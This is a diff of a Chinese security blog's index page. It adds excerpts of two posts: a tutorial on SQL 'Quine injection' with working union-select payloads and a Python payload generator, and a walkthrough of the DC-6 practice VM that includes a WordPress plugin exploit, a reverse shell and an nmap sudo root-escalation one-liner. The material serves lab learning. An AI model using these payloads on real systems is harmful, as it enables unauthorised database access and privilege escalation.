@@ -172,6 +172,193 @@
         
 
 <div class="post">
+    <a href="/2023/04/24/sql%E6%B3%A8%E5%85%A5%20Quine%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">
+        <h2 class="post-title">sql注入 Quine注入解析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/24
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>quine注入,即查询的结果是查询的语句</p>
+<p>首先看看如下sql语句会返回什么</p>
+<pre><code class="sql">select replace(&quot;.&quot;,char(46),&quot;.&quot;);
+</code></pre>
+<p>返回了一个点</p>
+<p>匹配字符串”.”中ascii码为46的字符并替换为”.”,也就是将”.”转换为”.”并返回</p>
+<p>继续看下面这个sql语句</p>
+<pre><code class="sql">select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;);
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/ddd986e7bc6d49d995755fb301370584.png" alt="在这里插入图片描述">很相似,但并不完全一致,查询出的结果是双引号的</p>
+<p>此处将字符串    <strong>replace(“.”,char(46),”.”)</strong></p>
+<p>中ascii码为46的字符替换为另一字符串 <strong>replace(“.”,char(46),”.”)</strong></p>
+<p>也就是</p>
+<p><strong>replace(“replace(“.”,char(46),”.”)”,char(46),”replace(“.”,char(46),”.”)”)</strong></p>
+<p>观察原来的查询语句</p>
+<p><strong>replace(‘ replace(“.”,char(46),”.”)’,char(46),’replace(“.”,char(46),”.”)’)</strong></p>
+<p>那么我们只需要将双引号替换成单引号就行</p>
+<pre><code class="sql">select replace(&quot;\&quot;\&quot;&quot;,char(34),char(39));
+</code></pre>
+<p>所以需要替换的字符串就变成了</p>
+<pre><code class="sql">&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;
+</code></pre>
+<p>这一步是替换单双引号</p>
+<pre><code class="sql">select replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39));
+</code></pre>
+<p>这一步是替换点为相关字符</p>
+<pre><code class="sql">select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
+</code></pre>
+<p>最终得到如上结果</p>
+<p>这样我们确实是可以执行sql语句了,但是还需要解决注入的问题(这样只能堆叠)<br>所以加入union select的sql语句如下</p>
+<pre><code class="sql">1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
+</code></pre>
+<h1 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h1><p>构造过程如下<br>第一步拿基本语句作为替换语句<br>比如我想要 1’union select #</p>
+<pre><code class="sql">1&quot;union select #
+</code></pre>
+<p>转单引号为双引号</p>
+<pre><code class="sql">1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#
+</code></pre>
+<p>放入基本语句</p>
+<p>第二步拼接</p>
+<pre><code class="sql">replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)
+</code></pre>
+<pre><code class="sql">replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)
+</code></pre>
+<p>补全</p>
+<pre><code class="sql">1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
+</code></pre>
+<h1 id="题目特征"><a href="#题目特征" class="headerlink" title="题目特征"></a>题目特征</h1><p>适用于如下的条件<br><img src="https://img-blog.csdnimg.cn/img_convert/8af6284c4c69e50af99460d0e3239738.png" alt="image-20230424135507408"><img src="https://img-blog.csdnimg.cn/img_convert/b0d43f37612ab511373ebcf8ca00f301.png" alt="image-20230424135535557"></p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="python">sql = input (&quot;输入你的sql语句,不用写关键查询的信息  形如 1&#39;union select #\n&quot;)
+sql2 = sql.replace(&quot;&#39;&quot;,&#39;&quot;&#39;)
+base = &quot;replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)&quot;
+final = &quot;&quot;
+def add(string):
+    if (&quot;--+&quot; in string):
+        tem = string.split(&quot;--+&quot;)[0] + base + &quot;--+&quot;
+    if (&quot;#&quot; in string):
+        tem = string.split(&quot;#&quot;)[0] + base + &quot;#&quot;
+    return tem
+def patch(string,sql):
+    if (&quot;--+&quot; in string):
+        return sql.split(&quot;--+&quot;)[0] + string + &quot;--+&quot;
+    if (&quot;#&quot; in string):
+        return sql.split(&quot;#&quot;)[0] + string + &quot;#&quot;
+
+res = patch(base.replace(&quot;.&quot;,add(sql2)),sql).replace(&quot; &quot;,&quot;/**/&quot;).replace(&quot;&#39;.&#39;&quot;,&#39;&quot;.&quot;&#39;)
+
+print(res)
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #ffa2c4">数据库</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/sql/" style="color: #ff7d73">sql</a>
+        </span>
+        
+    </div>
+    <a href="/2023/04/24/sql%E6%B3%A8%E5%85%A5%20Quine%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/04/21/DC-6%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">DC-6靶机通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/21
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/28790b49d34a4f6a9dbfb3c459016658.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e498790d905f451b9ef93877cc7d3a05.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>发现无法访问web<br>加个hosts<br><img src="https://img-blog.csdnimg.cn/75398b9fcbd64e47bdbab59e3637f972.png" alt="在这里插入图片描述"><br>这题类似那个dc2还是dc3,网站长的一样<br><img src="https://img-blog.csdnimg.cn/59cd4b9ce9f746a8b158c0f6f9559c16.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/c5894d31c6ee48c380e856fcb187ed97.png" alt="在这里插入图片描述"><br>wordPress5.1.1<br>上wpscan扫<br>enumrate一下user 看看能不能弱口令<br>测了wp给的那几个用户,都不能弱口令,dirsearch也没扫到什么有价值的路径<br>尝试ssh弱口令<br>没爆出来,回官网看了下描述<br><img src="https://img-blog.csdnimg.cn/5f2193d7f0fa408dbe4e7e1b6a6080e5.png" alt="在这里插入图片描述"><br>确实是弱口令,但是我的字典差着了,给了提示就用吧<br><img src="https://img-blog.csdnimg.cn/f164d3474e204bf5af16ed2ae7992e7d.png" alt="在这里插入图片描述"><br>账号mark 密码 helpdesk01<br>登录后台<br><img src="https://img-blog.csdnimg.cn/2297c026c7de49e390cea88fa1f3ece0.png" alt="在这里插入图片描述"><br>尝试使用相关插件漏洞<br><img src="https://img-blog.csdnimg.cn/f1e17535c6ab4667864691bfa8df275e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/be2c598f6e5344888e2875d9ca6c2774.png" alt="在这里插入图片描述"><br>发包,然后拿到反弹的shell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/fbc678aa07754f649e1bbd466a7fce1e.png" alt="在这里插入图片描述"><br>用LinEnum.sh遍历脆弱性<br>没发现什么可以利用的<br>回去翻home目录ls -al看看文件<br>发现jens用户下有一个backup.sh<br><img src="https://img-blog.csdnimg.cn/c83c00e12a9844efb78be073bb7667ad.png" alt="在这里插入图片描述"><br>然而我们不是devs组的,没法写这个文件<br>继续看<br><img src="https://img-blog.csdnimg.cn/092758c8d43042488b6fc5547586110c.png" alt="在这里插入图片描述"><br>发现mark下有个stuff文件夹<br>其内存在一个txt文件<br>里面暴露了graham的账号<br>尝试ssh登录<img src="https://img-blog.csdnimg.cn/51924e6673a2464d84fabc90f405d254.png" alt="在这里插入图片描述"></p>
+<p>登录上发现graham是该组的<br>sudo -l看看有什么可用的<br><img src="https://img-blog.csdnimg.cn/0b4821478d57468bba33942bf1cd8e8f.png" alt="在这里插入图片描述"></p>
+<p>发现我们可以以jens的身份去运行backups.sh文件,且我们可以写这个sh文件,那么我们就可以拿一个jens用户的shell了<br><img src="https://img-blog.csdnimg.cn/1a26bb17bc0a4abeab0fefca202a1832.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b21a30ba7ed84aed91f3b86d47ce1261.png" alt="在这里插入图片描述"><br>可以尝试nmap提权<br><code>TF=$(mktemp) echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &gt; $TF sudo nmap --script=$TF </code><br>这时候其实就拿到root权限的用户了,但是是看不见自己打了什么命令的,盲打一个优化shell<br><img src="https://img-blog.csdnimg.cn/6590c3a7571e41009eb640f10ea6c048.png" alt="在这里插入图片描述"><br>结束</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/linux/" style="color: #00bcd4">linux</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #ff7d73">运维</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/ssh/" style="color: #03a9f4">ssh</a>
+        </span>
+        
+    </div>
+    <a href="/2023/04/21/DC-6%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/04/16/2023%20GDOUCTF%20%E9%83%A8%E5%88%86wp/">
         <h2 class="post-title">2023 GDOUCTF 部分wp</h2>
     </a>
@@ -373,7 +560,7 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
     </div>
@@ -431,17 +618,17 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #00a596">python</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ff7d73">开发语言</a>
+            <a href="/tags/php/" style="color: #00a596">php</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/php/" style="color: #03a9f4">php</a>
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
         </span>
         
     </div>
@@ -487,12 +674,12 @@ print(flag)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00bcd4">开发语言</a>
         </span>
         
         <span class="tag">
@@ -590,17 +777,17 @@ sudo mount -t nfs 192.168.45.132:/home/peter /tmp/nfs
         
         <span class="tag">
             
-            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
+            <a href="/tags/linux/" style="color: #00a596">linux</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #03a9f4">服务器</a>
+            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #ff7d73">服务器</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="color: #ff7d73">学习</a>
+            <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="color: #ffa2c4">学习</a>
         </span>
         
     </div>
@@ -706,22 +893,22 @@ print(rv)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #00a596">python</a>
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/flask/" style="color: #ff7d73">flask</a>
+            <a href="/tags/flask/" style="color: #03a9f4">flask</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #ffa2c4">后端</a>
+            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #00bcd4">后端</a>
         </span>
         
     </div>
@@ -827,7 +1014,7 @@ print(sol)
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
     </div>
@@ -946,12 +1133,12 @@ print(two_squares(n))
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #00bcd4">python</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ff7d73">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+            <a href="/tags/python/" style="color: #03a9f4">python</a>
         </span>
         
     </div>
